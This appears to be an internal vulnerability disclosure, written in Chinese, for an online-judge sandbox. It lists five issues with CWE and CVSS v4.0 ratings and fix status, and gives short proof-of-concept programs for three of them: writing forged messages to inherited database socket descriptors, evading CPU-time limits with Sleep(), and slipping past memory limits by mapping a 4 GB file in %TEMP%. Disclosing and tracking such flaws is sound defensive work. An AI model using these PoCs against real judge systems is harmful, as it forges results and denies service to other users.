## 符号约定

PLV：进程限制违规（Process Limitation Violation）  
PAV：进程访问违规（Process Access Violation）  
DoS：拒绝服务（Denial of Service）

具体类型已用 CWE 标注。

CVSS 分数基于 CVSS v4.0 基础指标（范围中考虑了可选的威胁指标）。


## 已发现的漏洞

### PAV1/DoS1

**类型**：  
CWE-250（以不必要的权限执行）  
CWE-403（文件描述符暴露给非预期的控制域）  
```json
{
	"基础分数": 8.8,
	"分数范围": "8.6-9.3",
	"向量": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:L/SI:H/SA:H",
	"指标": {
		"攻击向量": "Local",
		"攻击复杂度": "Low",
		"攻击要求": "None",
		"所需权限": "Low",
		"用户交互": "None",
		"受影响系统机密性": "Low",
		"受影响系统完整性": "High",
		"受影响系统可用性": "High",
		"后续系统机密性": "Low",
		"后续系统完整性": "High",
		"后续系统可用性": "High"
	}
}
```

**受影响范围**：  
Linux 评测机  
在 1.0.0.0 内部测试期间

**描述**：  
子进程通过从父进程继承的 TCP 套接字文件描述符直接与数据库服务通信，导致数据库中产生伪造的结果、网络协议中断，并导致评测机因 SIGSEGV 退出。

**原因**：  
1. `fork()` 和 `execl()` 继承了父进程的文件描述符，包括用于与数据库通信的套接字 fd。  
2. 与通信协议相关的原因（已省略细节）可能导致整个评测机异常退出。

**PoC**：  
```cpp
#include <unistd.h>
#include <string>
std::string build_forged_message();
int main() {
    std::string msg = build_forged_message();
    for (int fd = 3; fd < 256; ++fd)
        write(fd, msg.data(), msg.size());
    return 0;
}
```

**状态**：  
未修复


### PLV1

**类型**：  
CWE-770（无限制或节流的资源分配）  
```json
{
	"基础分数": 3.5,
	"分数范围": "2.5-4.5",
	"向量": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
	"指标": {
		"攻击向量": "Local",
		"攻击复杂度": "Low",
		"攻击要求": "None",
		"所需权限": "Low",
		"用户交互": "None",
		"受影响系统机密性": "None",
		"受影响系统完整性": "None",
		"受影响系统可用性": "Low",
		"后续系统机密性": "None",
		"后续系统完整性": "None",
		"后续系统可用性": "None"
	}
}
```

**受影响范围**：  
Windows 评测机  
在 1.0.0.0 内部测试期间

**描述**：  
进程可以使用 `Sleep()` 绕过 CPU 时间限制，因为 `Sleep()` 几乎不消耗 CPU 时间，从而绕过基于 CPU 时间的限制。

**原因**：  
1. 评测机通过 `GetProcessTimes` 监控 CPU 时间（内核+用户），但 `Sleep()` 不消耗 CPU 时间，使得进程可以在不触发限制的情况下存活更久。

**PoC**：  
```cpp
#include <Windows.h>
int main() { Sleep(100000); return 0; }
```

**状态**：  
已修复


### PLV2

**类型**：  
CWE-755（异常条件处理不当）  
```json
{
	"基础分数": 3.5,
	"分数范围": "2.5-4.5",
	"向量": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
	"指标": {
		"攻击向量": "Local",
		"攻击复杂度": "Low",
		"攻击要求": "None",
		"所需权限": "Low",
		"用户交互": "None",
		"受影响系统机密性": "None",
		"受影响系统完整性": "None",
		"受影响系统可用性": "Low",
		"后续系统机密性": "None",
		"后续系统完整性": "None",
		"后续系统可用性": "None"
	}
}
```

**受影响范围**：  
Windows 评测机  
在 1.0.0.0 内部测试期间

**描述**：  
因作业对象（Job Object）行为异常，超过 CPU 时间或内存限制的进程无法被正确终止，导致进程无限期运行。

**原因**：  
1. 作业对象限制强制实施偶尔失效，导致进程超出限制时未被终止。

**状态**：  
已修复


### PLV3/PAV2/DoS2

**类型**：  
CWE-276（默认权限不正确）  
CWE-400（不受控制的资源消耗）  
CWE-61（符号链接跟随）  
```json
{
	"基础分数": 9.3,
	"分数范围": "8.3-9.8",
	"向量": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
	"指标": {
		"攻击向量": "Local",
		"攻击复杂度": "Low",
		"攻击要求": "None",
		"所需权限": "Low",
		"用户交互": "None",
		"受影响系统机密性": "High",
		"受影响系统完整性": "High",
		"受影响系统可用性": "High",
		"后续系统机密性": "High",
		"后续系统完整性": "High",
		"后续系统可用性": "High"
	}
}
```

**受影响范围**：  
Windows 评测机  
在 1.0.0.0 内部测试期间

**描述**：  
AppContainer 沙箱授予对 `%TEMP%` 和 `C:\Users\<User>\AppData\Local\Packages\<SID>\` 的读/写/执行（RWE）权限。这允许沙箱化进程：
- 写入任意文件，可能填满磁盘（DoS）。
- 创建指向敏感系统文件的符号链接（或硬链接），如果评测机后续操作这些链接，则可能导致未授权访问或权限提升。

**原因**：  
1. AppContainer 对这些目录的默认权限过于宽松，违反了最小权限原则。  
2. 对文件类型或链接创建没有限制，允许资源耗尽和基于链接的攻击。

**状态**：  
已实现，待测试


### PLV4/PAV3

**类型**：  
CWE-770（无限制或节流的资源分配）  
CWE-400（不受控制的资源消耗）  
```json
{
	"基础分数": 7.5,
	"分数范围": "6.5-8.5",
	"向量": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
	"指标": {
		"攻击向量": "Local",
		"攻击复杂度": "Low",
		"攻击要求": "None",
		"所需权限": "Low",
		"用户交互": "None",
		"受影响系统机密性": "None",
		"受影响系统完整性": "None",
		"受影响系统可用性": "High",
		"后续系统机密性": "None",
		"后续系统完整性": "None",
		"后续系统可用性": "None"
	}
}
```

**受影响范围**：  
Windows 评测机  
在 1.0.0.0 内部测试期间

**描述**：  
进程可以通过在 `%TEMP%` 中创建文件，并使用 `CreateFileMappingA`/`MapViewOfFile` 将其映射到工作页，从而绕过内存限制。映射的内存在 `GetProcessMemoryInfo` 报告的 `PeakPageFileUsage` 中未完全计入，因此规避了内存限制检查。

**原因**：  
1. AppContainer 允许对 `%TEMP%` 的 RWE 访问，使文件创建和映射成为可能。  
2. `PeakPageFileUsage` 不包含内存映射文件的工作集大小，因此内存消耗未计入限制。

**PoC**：  
```cpp
#include <windows.h>
#include <iostream>
#include <chrono>
#include <thread>
int main() {
    const size_t SIZE = 4ULL * 1024 * 1024 * 1024;
    char tempPath[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tempPath)) return 1;
    std::string filePath = std::string(tempPath) + "poc_mmap.bin";
    HANDLE hFile = CreateFileA(filePath.c_str(),
                               GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 1;
    LARGE_INTEGER li; li.QuadPart = SIZE;
    if (!SetFilePointerEx(hFile, li, NULL, FILE_BEGIN) || !SetEndOfFile(hFile)) {
        CloseHandle(hFile); return 1;
    }
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READWRITE,
                                         li.HighPart, li.LowPart, NULL);
    if (!hMapping) { CloseHandle(hFile); return 1; }
    void* view = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, SIZE);
    if (!view) {
        CloseHandle(hMapping); CloseHandle(hFile); return 1;
    }
    char* p = static_cast<char*>(view);
    for (size_t i = 0; i < SIZE; i += 4096) p[i] = 0xAA;
    std::this_thread::sleep_for(std::chrono::seconds(4));
    UnmapViewOfFile(view);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    DeleteFileA(filePath.c_str());
    return 0;
}
```

**状态**：  
已缓解，未完全修复